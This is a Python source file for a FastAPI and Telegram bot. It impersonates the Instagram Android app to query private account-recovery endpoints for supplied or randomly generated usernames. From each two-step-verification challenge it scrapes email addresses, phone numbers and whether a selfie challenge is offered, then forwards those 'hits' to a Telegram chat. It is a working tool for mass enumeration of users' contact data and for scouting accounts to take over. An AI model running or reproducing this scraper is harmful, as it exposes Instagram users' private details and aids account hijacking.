import os
import re
import uuid
import random
import string
import time
import threading
import requests
from fastapi import FastAPI, Request
from telegram import Bot, Update
from telegram.ext import Application
import asyncio

# ====================== CONFIG FROM ENV ======================
TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")   # e.g. https://your-project.vercel.app

if not TOKEN or not CHAT_ID:
    raise ValueError("BOT_TOKEN and CHAT_ID must be set in Vercel Environment Variables")

bot = Bot(token=TOKEN)
app = FastAPI()

# Global stats
hads = bad = erore = 0
checked_users = set()
is_running = False
lock = threading.Lock()

# ====================== CHECK FUNCTION ======================
def check_one(username: str):
    global hads, bad, erore
    username = username.strip().lstrip('@')
    if not username:
        return

    with lock:
        if username in checked_users:
            return
        checked_users.add(username)

    try:
        sess = requests.Session()
        # ... (same stable headers as before)
        random_hex = ''.join(random.choices('0123456789abcdef', k=16))
        device_id = str(uuid.uuid4())

        headers = {
            'User-Agent': 'Instagram 390.0.0.43.81 Android (33/13; 480dpi; 1080x2316; HONOR; RMO-NX1; HNRMO-Q; qcom; ar_IQ; 766920165)',
            'accept-language': 'ar-IQ, en-US',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-ig-app-id': '567067343352427',
            'x-ig-device-id': device_id,
        }

        data = {
            'params': f'{{"client_input_params":{{"is_username_or_email":1,"search_query":"{username}"}},"server_params":{{"is_from_logged_out":0,"device_id":"{device_id}"}}}}',
            'bk_client_context': '{"bloks_version":"b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5","styles_id":"instagram"}',
            'bloks_versioning_id': 'b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5',
        }

        res1 = sess.post('https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.uhl.nav.async/', 
                        headers=headers, data=data, timeout=10)

        if res1.status_code == 200:
            match = re.search(r'Q-PTB[a-zA-Z0-9_\-]*\|aplrr', res1.text)
            if match:
                token = match.group(0)
                res2 = sess.post(
                    'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.ap.two_step_verification.challenge_picker/',
                    headers=headers,
                    data={'params': f'{{"server_params":{{"context_data":"{token}"}}}}', 
                          'bk_client_context': '{"bloks_version":"b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5","styles_id":"instagram"}',
                          'bloks_versioning_id': 'b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5'},
                    timeout=10
                ).text

                has_selfie = 'SELFIE' in res2.upper()
                emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', res2)
                phone = re.search(r'(\+\d{1,4}[\s\d\-\(\)]{8,})', res2)

                if has_selfie:
                    with lock:
                        global hads
                        hads += 1
                    msg = f"🎯 **Selfie Hit!**\n\n👤 @{username}\n📧 {', '.join(set(emails)) or 'No email'}\n📞 {phone.group(0) if phone else 'No phone'}"
                    asyncio.run(bot.send_message(chat_id=CHAT_ID, text=msg))
                else:
                    with lock:
                        global bad
                        bad += 1
            else:
                with lock: global bad; bad += 1
        else:
            with lock: global erore; erore += 1

    except:
        with lock: global erore; erore += 1


# ====================== TELEGRAM WEBHOOK ======================
@app.post("/")
async def webhook(request: Request):
    try:
        data = await request.json()
        update = Update.de_json(data, bot)
        # You can add command handlers here if needed
        return {"status": "ok"}
    except:
        return {"status": "error"}


# ====================== COMMANDS via GET (for easy testing) ======================
@app.get("/check")
async def api_check(username: str):
    threading.Thread(target=check_one, args=(username,), daemon=True).start()
    return {"status": "checking", "user": username}

@app.get("/start")
async def api_start():
    global is_running
    is_running = True
    # Limited random mode (serverless limitation)
    for _ in range(20):   # Limited because of Vercel timeout
        threading.Thread(target=random_worker, daemon=True).start()
    return {"status": "started (limited mode)"}

def random_worker():
    chars = "qwertyuioplkjhgfdsazxcvbnm1234567890._"
    while is_running:
        user = ''.join(random.choices(chars, k=random.randint(4,7)))
        check_one(user)
        time.sleep(1.5)   # Be gentle with Vercel

@app.get("/stats")
async def api_stats():
    return {
        "selfie": hads,
        "bad": bad,
        "error": erore,
        "running": is_running
    }

# ====================== SET WEBHOOK ======================
@app.on_event("startup")
async def set_webhook():
    await bot.set_webhook(url=WEBHOOK_URL)

# For local testing
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
